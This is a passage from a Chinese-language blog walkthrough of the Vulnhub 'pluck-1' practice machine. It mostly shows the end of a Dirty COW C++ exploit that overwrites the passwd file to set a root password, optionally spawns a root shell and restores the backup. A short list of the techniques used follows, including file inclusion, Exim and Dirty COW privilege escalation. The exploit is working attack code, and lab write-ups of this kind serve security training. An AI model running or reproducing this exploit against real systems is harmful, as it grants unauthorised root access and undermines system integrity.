exitOnError(&quot;Error reading  su prompt.&quot;);</span></span><br><span class="line"><span class="string">       cerr &lt;&lt; &quot;Received su prompt (&quot; &lt;&lt; buffv &lt;&lt; &quot;)&quot; &lt;&lt; endl; </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       if(write(master, TXTPWD, strlen(TXTPWD)) &lt;= 0) </span></span><br><span class="line"><span class="string">            exitOnError(&quot;Error writing pwd on tty.&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       if(write(master, DISABLEWB, strlen(DISABLEWB)) &lt;= 0) </span></span><br><span class="line"><span class="string">            exitOnError(&quot;Error writing cmd on tty.&quot;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       if(!opShell)&#123;</span></span><br><span class="line"><span class="string">            if(write(master, EXITCMD, strlen(EXITCMD)) &lt;= 0) </span></span><br><span class="line"><span class="string">                 exitOnError(&quot;Error writing exit cmd on tty.&quot;);</span></span><br><span class="line"><span class="string">       &#125;else&#123;</span></span><br><span class="line"><span class="string">           if(restPwd)&#123;</span></span><br><span class="line"><span class="string">               string restoreCmd = string(CPCMD).append(TMPBAKFILE).append(&quot; &quot;).append(PWDFILE).append(&quot;\n&quot;);</span></span><br><span class="line"><span class="string">               if(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) </span></span><br><span class="line"><span class="string">                    exitOnError(&quot;Error writing restore cmd on tty.&quot;);</span></span><br><span class="line"><span class="string">               restoreCmd        = string(RMCMD).append(TMPBAKFILE).append(&quot;\n&quot;);</span></span><br><span class="line"><span class="string">               if(write(master, restoreCmd.c_str(), restoreCmd.size()) &lt;= 0) </span></span><br><span class="line"><span class="string">                    exitOnError(&quot;Error writing restore cmd (rm) on tty.&quot;);</span></span><br><span class="line"><span class="string">           &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">           if(tcgetattr(STDIN_FILENO, &amp;termOld) == -1 )</span></span><br><span class="line"><span class="string">                exitOnError(&quot;Error getting terminal attributes.&quot;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">           termNew               = termOld;</span></span><br><span class="line"><span class="string">           termNew.c_lflag       &amp;= static_cast&lt;unsigned long&gt;(~(ICANON | ECHO));</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">           if(tcsetattr(STDIN_FILENO, TCSANOW, &amp;termNew) == -1)</span></span><br><span class="line"><span class="string">                exitOnError(&quot;Error setting terminal in non-canonical mode.&quot;);</span></span><br><span class="line"><span class="string">           rawMode = true;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">           while(true)&#123;</span></span><br><span class="line"><span class="string">                FD_ZERO(&amp;rfds);</span></span><br><span class="line"><span class="string">                FD_SET(master, &amp;rfds);</span></span><br><span class="line"><span class="string">                FD_SET(STDIN_FILENO, &amp;rfds);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">                if(select(master + 1, &amp;rfds, nullptr, nullptr, nullptr) &lt; 0 )</span></span><br><span class="line"><span class="string">                    exitOnError(&quot;Error on select tty.&quot;);</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">                if(FD_ISSET(master, &amp;rfds)) &#123;</span></span><br><span class="line"><span class="string">                    memset(buffv, 0, BUFFSIZE);</span></span><br><span class="line"><span class="string">                    bytes_read = read(master, buffv, BUFFSIZE - 1);</span></span><br><span class="line"><span class="string">                    if(bytes_read &lt;= 0) break;</span></span><br><span class="line"><span class="string">                    if(write(STDOUT_FILENO, buffv, bytes_read) != bytes_read)</span></span><br><span class="line"><span class="string">                          exitOnError(&quot;Error writing on stdout.&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">                if(FD_ISSET(STDIN_FILENO, &amp;rfds)) &#123;</span></span><br><span class="line"><span class="string">                    memset(buffv, 0, BUFFSIZE);</span></span><br><span class="line"><span class="string">                    bytes_read = read(STDIN_FILENO, buffv, BUFFSIZE - 1);</span></span><br><span class="line"><span class="string">                    if(bytes_read &lt;= 0) exitOnError(&quot;Error reading from stdin.&quot;);</span></span><br><span class="line"><span class="string">                    if(write(master, buffv, bytes_read) != bytes_read) break;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">  return [](int ret, bool shell)&#123; </span></span><br><span class="line"><span class="string">       string msg</span> = shell ? <span class="string">&quot;Exit.\n&quot;</span> : string(<span class="string">&quot;Root password is:   &quot;</span>) + TXTPWD + <span class="string">&quot;Enjoy! :-)\n&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span>(ret &lt;= MAXITER)&#123;cerr &lt;&lt; <span class="string">msg; return 0;&#125;</span></span><br><span class="line"><span class="string">       else&#123;cerr &lt;&lt; &quot;Exploit failed.\n&quot;; return 1;&#125; </span></span><br><span class="line"><span class="string">  &#125;(iter, opShell);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">void printInfo(char* cmd)&#123;</span></span><br><span class="line"><span class="string">      cerr &lt;&lt; cmd &lt;&lt; &quot; [-s] [-n] | [-h]\n&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="string">      cerr &lt;&lt; &quot; -s  open directly a shell, if the exploit is successful;&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="string">      cerr &lt;&lt; &quot; -n  combined with -s, doesn&#x27;t restore the passwd file.&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="string">      cerr &lt;&lt; &quot; -h  print this synopsis;&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="string">      cerr &lt;&lt; &quot;\n If no param is specified, the program modifies the passwd file and exits.&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="string">      cerr &lt;&lt; &quot; A copy of the passwd file will be create in the current directory as .ssh_bak&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="string">      cerr &lt;&lt; &quot; (unprivileged user), if no parameter or -n is specified.\n&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="string">      exit(1);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main(int argc, char** argv)&#123;</span></span><br><span class="line"><span class="string">   const char  flags[]   = &quot;shn&quot;;</span></span><br><span class="line"><span class="string">   int         c;</span></span><br><span class="line"><span class="string">   bool        opShell   = false,</span></span><br><span class="line"><span class="string">               restPwd   = true;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   opterr = 0;</span></span><br><span class="line"><span class="string">   while ((c = getopt(argc, argv, flags)) != -1)&#123;</span></span><br><span class="line"><span class="string">      switch (c)&#123;</span></span><br><span class="line"><span class="string">         case &#x27;s&#x27;:</span></span><br><span class="line"><span class="string">            opShell = true;</span></span><br><span class="line"><span class="string">         break;</span></span><br><span class="line"><span class="string">         case &#x27;n&#x27;:</span></span><br><span class="line"><span class="string">            restPwd = false;</span></span><br><span class="line"><span class="string">         break;</span></span><br><span class="line"><span class="string">         case &#x27;h&#x27;:</span></span><br><span class="line"><span class="string">            printInfo(argv[0]);</span></span><br><span class="line"><span class="string">         break;</span></span><br><span class="line"><span class="string">         default:</span></span><br><span class="line"><span class="string">            cerr &lt;&lt; &quot;Invalid parameter.&quot; &lt;&lt; endl &lt;&lt; endl;</span></span><br><span class="line"><span class="string">            printInfo(argv[0]);</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   if(!restPwd &amp;&amp; !opShell)&#123;</span></span><br><span class="line"><span class="string">            cerr &lt;&lt; &quot;Invalid parameter: -n requires -s&quot; &lt;&lt; endl &lt;&lt; endl;</span></span><br><span class="line"><span class="string">            printInfo(argv[0]);</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   Dcow dcow(opShell, restPwd);</span></span><br><span class="line"><span class="string">   return dcow.expl();</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><font color="red"><em><strong>此外UDP69端口开放也可以使用tftp下载backup.tar文件</strong></em></font></p>
+<h3 id="知识点总结"><a href="#知识点总结" class="headerlink" title="知识点总结"></a>知识点总结</h3><ul>
+<li>文件包含</li>
+<li>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode协议加密传输下载文件</li>
+<li>ssh key 登录shell</li>
+<li>vim命令设置shell并跳至shell</li>
+<li>Exim-4.84-3-本地提权</li>
+<li>脏牛提权(dirty cow)</li>
+<li>udp66端口tftp文件下载</li>
+</ul>
+<p><font color="red">Game over</font></p>
+<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
+<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
+<p><font color="green"><em><strong>The end,to be continue…</strong></em></font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2020/04/08/pluck-1/" title="vulnhub靶机渗透[pluck-1]">https://fdlucifer.github.io/2020/04/08/pluck-1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/vulnhub%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> vulnhub靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/04/07/Lampiao-1/" rel="prev" title="vulnhub靶机渗透[Lampiao-1]">
+                  <i class="fa fa-chevron-left"></i> vulnhub靶机渗透[Lampiao-1]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/04/09/goreverseshell/" rel="next" title="goreverseshell---基于golang的tcp-reverseshell">
+                  goreverseshell---基于golang的tcp-reverseshell <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
